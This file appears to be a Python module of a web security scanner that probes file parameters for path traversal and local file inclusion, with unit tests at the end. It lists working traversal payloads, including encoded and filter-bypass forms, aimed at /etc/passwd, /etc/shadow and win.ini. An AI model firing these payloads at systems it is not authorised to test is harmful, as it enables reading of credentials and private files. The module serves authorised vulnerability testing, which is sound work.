"""Path traversal scanner — detect directory traversal and LFI in file parameters."""
from __future__ import annotations

import asyncio
import re
import sys
import time
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity
from common.fp_reducer import FPReducer, Confidence

CVSS_TRAVERSAL = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
CVSS40_TRAVERSAL = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
TRAVERSAL_PAYLOADS = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    # Encoded
    "%2e%2e%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/etc/passwd",
    "..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    # Double encoded
    "%252e%252e%252fetc%252fpasswd",
    # Windows
    "..\\..\\windows\\win.ini",
    "..%5c..%5cwindows%5cwin.ini",
    # Null byte
    "../etc/passwd%00",
    "../etc/passwd%00.jpg",
    # Bypass filters
    "....//....//etc/passwd",
    "..././..././etc/passwd",
]

SENSITIVE_TARGETS = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/version",
    "/proc/self/environ",
    "C:\\Windows\\win.ini",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
]

PASSWD_INDICATORS = ["root:x:", "root:0:0:", "daemon:x:", "nobody:x:"]
WIN_INDICATORS    = ["; for 16-bit app support", "[fonts]", "[Mail]"]


class PathTraversal(BaseModule):
    """Path traversal / LFI scanner."""

    NAME        = "path_traversal"
    DESCRIPTION = "Detect directory traversal and LFI in file-serving parameters"
    PHASE       = 6
    TAGS        = ["access-control", "path-traversal", "lfi", "cwe-22", "owasp-a01"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        target = self.config.target.rstrip("/")
        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        self._fp = FPReducer(
            collab_client=self.config.extra.get("collab_client"),
            headers=self.config.extra.get("session_headers", {}),
        )
        crawled = self.config.extra.get("crawled_urls", [target])
        forms   = self.config.extra.get("found_forms", [])

        # Focus on params that suggest file operations
        file_param_pattern = re.compile(
            r"(file|path|name|dir|folder|doc|page|template|view|load|include|"
            r"filename|filepath|f=|p=)", re.IGNORECASE
        )

        targets: list[tuple[str, str]] = []  # (url, param_name)
        for url in crawled[:50]:
            if "?" in url:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                for param in params:
                    if file_param_pattern.search(param):
                        targets.append((url, param))

        # Also test common file endpoints
        for path in ["/download", "/file", "/static", "/assets", "/media", "/image"]:
            for param in ["file", "path", "name", "f", "p"]:
                targets.append((f"{target}{path}?{param}=test.txt", param))

        sem = asyncio.Semaphore(3)
        tasks = [self._test_traversal(url, param, target, sem)
                 for url, param in targets[:30]]
        await asyncio.gather(*tasks, return_exceptions=True)

        return self._make_result(start)

    async def _test_traversal(
        self, url: str, param_name: str, target: str, sem: asyncio.Semaphore
    ) -> None:
        async with sem:
            if not self.check_scope(url):
                return

            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)

            for payload in TRAVERSAL_PAYLOADS:
                await self.rate_limit()
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param_name] = payload
                test_url = (
                    f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    f"?{urlencode(test_params)}"
                )
                try:
                    import aiohttp
                    async with aiohttp.ClientSession(
                        connector=aiohttp.TCPConnector(ssl=False)
                    ) as session:
                        async with session.get(
                            test_url,
                            timeout=aiohttp.ClientTimeout(total=8),
                            allow_redirects=False,
                        ) as resp:
                            if resp.status == 200:
                                body = await resp.text(errors="ignore")

                                if any(ind in body for ind in PASSWD_INDICATORS):
                                    ev = Evidence(
                                        request_raw=f"GET {test_url}",
                                        response_raw=body[:500],
                                        extra={"param": param_name, "payload": payload},
                                    )
                                    ev.screenshot_path = self.capture_screenshot(
                                        test_url, finding_id=f"traversal_{param_name}"
                                    )
                                    self.new_finding(
                                        title=f"Path Traversal — /etc/passwd Read ({param_name})",
                                        severity=Severity.CRITICAL,
                                        description=(
                                            f"Directory traversal confirmed via '{param_name}' parameter. "
                                            f"Server returned /etc/passwd contents. "
                                            "An attacker can read arbitrary files, including "
                                            "credentials, private keys, and configuration files."
                                        ),
                                        reproduction_steps=[
                                            f"curl '{test_url}'",
                                            f"Payload: {payload}",
                                        ],
                                        remediation=(
                                            "Validate file paths against a strict allowlist. "
                                            "Use canonical path resolution and verify the result "
                                            "stays within the intended directory. "
                                            "Avoid passing user input to file system functions."
                                        ),
                                        references=["CWE-22", "OWASP A01:2021"],
                                        evidence=ev,
                                        cvss_v31_vector=CVSS_TRAVERSAL,
                                        cvss_v40_vector=CVSS40_TRAVERSAL,
                                        mitre_attack=["TA0007/T1083"],
                                        target=target,
                                        url=url,
                                    )
                                    return  # One finding per endpoint is enough

                                elif any(ind in body for ind in WIN_INDICATORS):
                                    ev = Evidence(
                                        request_raw=f"GET {test_url}",
                                        response_raw=body[:300],
                                        extra={"param": param_name, "payload": payload},
                                    )
                                    self.new_finding(
                                        title=f"Path Traversal — Windows File Read ({param_name})",
                                        severity=Severity.CRITICAL,
                                        description=(
                                            f"Path traversal confirmed — Windows win.ini read via '{param_name}'."
                                        ),
                                        reproduction_steps=[f"curl '{test_url}'"],
                                        remediation="Validate and canonicalize file paths server-side.",
                                        references=["CWE-22"],
                                        evidence=ev,
                                        cvss_v31_vector=CVSS_TRAVERSAL,
                                        cvss_v40_vector=CVSS40_TRAVERSAL,
                                        target=target,
                                        url=url,
                                    )
                                    return
                except Exception:
                    pass


class TestPathTraversal:
    def test_payloads_not_empty(self) -> None:
        assert len(TRAVERSAL_PAYLOADS) >= 10

    def test_passwd_indicators(self) -> None:
        body = "root:x:0:0:root:/root:/bin/bash"
        assert any(ind in body for ind in PASSWD_INDICATORS)

    def test_encoded_payload_present(self) -> None:
        assert any("%" in p for p in TRAVERSAL_PAYLOADS)
